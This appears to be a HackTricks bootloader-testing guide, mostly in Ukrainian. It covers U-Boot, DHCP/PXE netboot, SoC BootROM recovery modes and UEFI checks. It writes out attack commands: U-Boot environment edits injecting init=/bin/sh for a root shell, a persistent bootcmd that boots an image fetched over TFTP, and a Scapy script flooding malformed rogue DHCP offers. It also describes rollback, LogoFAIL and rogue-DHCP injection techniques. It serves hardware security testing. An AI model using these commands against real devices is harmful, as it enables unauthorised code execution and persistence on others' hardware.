# Тестування Bootloader

{{#include ../../banners/hacktricks-training.md}}

Нижче наведено рекомендовані кроки для модифікації конфігурацій старту пристрою та тестування bootloader-ів, таких як U-Boot і UEFI-клас завантажувачі. Зосередьтеся на отриманні раннього виконання коду, оцінці захистів підпису/відкату (signature/rollback) та зловживанні шляхами відновлення або мережевого завантаження.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: швидкі перемоги та зловживання environment

1. Access the interpreter shell
- Під час завантаження натисніть відомий key для переривання (часто будь-яку клавішу, 0, space або специфічну для плати "magic" послідовність) перед виконанням `bootcmd`, щоб потрапити в промпт U-Boot.

2. Inspect boot state and variables
- Корисні команди:
- `printenv` (дамп environment)
- `bdinfo` (інформація про плату, адреси пам'яті)
- `help bootm; help booti; help bootz` (підтримувані методи завантаження kernel)
- `help ext4load; help fatload; help tftpboot` (доступні лоадери)

3. Modify boot arguments to get a root shell
- Додайте `init=/bin/sh`, щоб kernel запускав shell замість звичайного init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Налаштуйте мережу та витягніть kernel/fit image з LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Якщо сховище env не захищене від запису, можна зберегти контроль:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Перевірте такі змінні як `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, які впливають на fallback-шляхи. Неправильно налаштовані значення можуть дозволити повторно потрапляти в shell.

6. Check debug/unsafe features
- Шукайте: `bootdelay` > 0, `autoboot` відключено, необмежений `usb start; fatload usb 0:1 ...`, можливість `loady`/`loads` через serial, `env import` з ненадійних носіїв, та kernel/ramdisk, які завантажуються без перевірок підпису.

7. U-Boot image/verification testing
- Якщо платформа заявляє про secure/verified boot з FIT images, спробуйте як unsigned, так і підроблені образи:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або старої поведінки `verify=n` часто дозволяє запускати довільні payload-и.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- У спадщині BOOTP/DHCP у U-Boot були проблеми з безпекою пам'яті. Наприклад, CVE‑2024‑42040 описує розкриття пам'яті через спеціально сформовані DHCP-відповіді, які можуть leak байти з пам'яті U-Boot назад у мережу. Проганяйте DHCP/PXE шляхи з надто довгими/граничними значеннями (option 67 bootfile-name, vendor options, file/servername fields) і спостерігайте за зависаннями/leak-ами.
- Мінімальний Scapy snippet для навантаження параметрів завантаження під час netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Також перевірте, чи поля PXE filename передаються в shell/loader логіку без санітизації при ланцюгових OS-side provisioning скриптах.

9. Rogue DHCP server command injection testing
- Налаштуйте rogue DHCP/PXE сервіс і спробуйте інжектити символи в поля filename або options, щоб дістатися до командних інтерпретаторів на пізніших етапах boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, або кастомні Scapy скрипти добре підходять. Обов'язково ізолюйте лабораторну мережу.

## SoC ROM recovery modes that override normal boot

Багато SoC мають BootROM "loader" режим, який приймає код по USB/UART навіть якщо flash-образи некоректні. Якщо secure-boot fuses не перепаяні/не спалені, це може забезпечити довільне виконання коду дуже рано в ланцюжку.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Оцініть, чи пристрій має secure-boot eFuses/OTP спалені. Якщо ні, BootROM download режими часто обходять вищерівневі перевірки (U-Boot, kernel, rootfs), виконуючи ваш перший-stage payload безпосередньо з SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Змонтуйте EFI System Partition (ESP) і перевірте компоненти завантажувача: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, шляхи логотипів vendor.
- Спробуйте завантажитись з пониженими або відомо вразливими підписаними компонентами завантаження, якщо Secure Boot revocations (dbx) не в актуальному стані. Якщо платформа все ще довіряє старим shim/bootmanagers, часто можна завантажити власний kernel або `grub.cfg` з ESP для отримання стійкості.

11. Boot logo parsing bugs (LogoFAIL class)
- Декілька OEM/IBV firmware були вразливі до помилок парсингу зображень у DXE, які обробляють boot логотипи. Якщо атакувач може помістити спеціально сформоване зображення в ESP під vendor-специфічним шляхом (наприклад, `\EFI\<vendor>\logo\*.bmp`) і перезавантажити, можливе виконання коду на ранньому етапі boot навіть при включеному Secure Boot. Перевірте, чи платформа приймає логотипи, які додає користувач, і чи ці шляхи записувані з ОС.

## Hardware caution

Будьте обережні при взаємодії з SPI/NAND flash під час раннього завантаження (наприклад, замикання контактів, щоб обійти читання) і завжди консультуйтеся з даташитом flash. Неправильно вчасно зроблені шорт-контакти можуть пошкодити пристрій або програматор.

## Notes and additional tips

- Спробуйте `env export -t ${loadaddr}` та `env import -t ${loadaddr}` для переміщення blob-ів environment між RAM і сховищем; деякі платформи дозволяють імпортувати env з знімних носіїв без аутентифікації.
- Для persistence на Linux-системах, які завантажуються через `extlinux.conf`, модифікація рядка `APPEND` (щоб інжектити `init=/bin/sh` або `rd.break`) на розділі завантаження часто достатня, коли перевірки підпису не примусово.
- Якщо в userland є `fw_printenv/fw_setenv`, перевірте, що `/etc/fw_env.config` відповідає реальному сховищу env. Неправильні offset-и дозволяють читати/писати не ту MTD-область.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
